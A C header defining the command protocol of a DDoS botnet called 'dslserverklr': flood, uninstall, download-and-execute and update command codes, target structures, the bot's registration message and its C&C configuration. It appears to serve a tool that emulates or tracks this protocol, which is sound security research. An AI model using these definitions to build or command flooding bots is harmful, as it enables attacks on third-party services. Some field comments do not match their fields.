#ifndef __DSLSERVERKLR_H_
#define __DSLSERVERKLR_H_

#define DSLSERVERKLR_CMD_IP_FLOOD 2
#define DSLSERVERKLR_CMD_HTTP_FLOOD 3
#define DSLSERVERKLR_CMD_TRANS_FLOOD 4
#define DSLSERVERKLR_CMD_STOP_FLOOD 5

#define DSLSERVERKLR_CMD_UNINSTALL 6
#define DSLSERVERKLR_CMD_EXEC_INTERNET_FILE 16
#define DSLSERVERKLR_CMD_EXEC_INTERNET_FILE2 17
#define DSLSERVERKLR_CMD_UPDATE 18
#define DSLSERVERKLR_CMD_EXEC_IE_1 19
#define DSLSERVERKLR_CMD_EXEC_IE_2 20

#define DSLSERVERKLR_MSG_SIZE 0x404

#pragma pack(push)
#pragma pack(1)

typedef struct _dslserverklr_flood_command_data
{
    char target_host[0x80];
    u_int target_port;
    u_int reserved;
    u_int thread_count;  // 0x88
    u_int subcode;  // 0x8C
} dslserverklr_flood_cmddata;

typedef struct _dslserverklr_http_command_data
{
    char target_host[0x80];
    char url[0x80];  // 0x80
    u_int target_port;  //0x100
    int reserved1;  // 0x104
    u_int thread_count;  // 0x108
    int with_dual_flood_when_sub_5;  // 0x10C
    int reserved2;  // 0x110
    int subcode;  // 0x114
} dslserverklr_http_cmddata;

typedef struct _dslserverklr_tcp_command_data
{
    char target_host[0x80];
    char data[0x200];  // 0x80
    u_int target_port;  //0x280
    u_int reserved;  // 0x284
    u_int thread_count;  // 0x288
    u_int subcode;  // 0x28C
} dslserverklr_tcp_cmddata;

typedef struct _dslserverklr_ctl_command_data
{
    char url[0x80];
    char data[0x200];  // 0x80
    u_int target_port;  //0x280
    u_int reserved;  // 0x284
    u_int thread_count;  // 0x288
    u_int subcode;  // 0x28C
} dslserverklr_ctl_cmddata;

// command from server to client
typedef struct _dslserverklr_command
{
    u_int cmdcode;
    union
    {
        struct _dslserverklr_flood_command_data udp_data;
        struct _dslserverklr_http_command_data http_data;
        struct _dslserverklr_tcp_command_data tcp_data;
        dslserverklr_ctl_cmddata ctl_data;
    };
} dslserverklr_command;

// the first message from client to server
typedef struct _dslserverklr_register_msg
{
    int version;
    char locale_info[64]; // Processor information
    char computer_name[128]; // Memory information
    char os[64]; // Operating System information
    char mem[32]; // e.g., 512 MB
    char cpu[32]; // e.g., 2613 MHz
    char other[48]; // Bot version information
} dslserverklr_register_msg;

typedef struct _dslserverklr_bot_conf
{
    char cc_server[100];
    char version[32];
    int cc_port;
    int lang_id;
} dslserverklr_bot_conf;

#pragma pack(pop)

typedef struct _dslserverklr_cmd_info
{    
    unsigned port;  // target port, or download server port 
    unsigned threads;
    unsigned subcode;
    string host;  // target host, or download server
    string url;
    char data[1024];
    unsigned datasize;
} dslserverklr_cmd_info;

//void dsl_makecmd(dslserverklr_command &, string &, string &, string &, string &, string &);
void dsl_makecmd(dslserverklr_command &, const dslserverklr_cmd_info&);

void dsl_parsecmd(const dslserverklr_command &, dslserverklr_cmd_info&);

#endif
